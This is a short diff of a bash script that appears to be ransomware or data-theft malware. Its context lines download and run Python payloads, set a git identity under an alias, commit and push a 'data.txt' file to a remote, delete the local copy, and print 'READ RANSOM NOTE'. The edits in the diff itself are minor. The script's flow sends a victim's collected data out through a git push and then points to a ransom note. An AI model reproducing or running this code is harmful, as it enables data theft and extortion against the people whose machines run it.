@@ -7,7 +7,6 @@ mv scaredstraight.py?raw=true scaredstraight.py
 clear
 #!/bin/bash
 python monsterwith23faces.py
-echo "hejsa"
 git config --global user.name samsepi0lw
 git config --global user.email samsepi0lw@proton.me
 git config --global github.user samsepi0lw
@@ -17,6 +16,7 @@ git add ./data.txt
 git commit -m "Uploaded data file"
 git push origin master
 rm ./data.txt
+#!/bin/bash
 python scaredstraight.py
 clear
 echo "READ RANSOM NOTE"
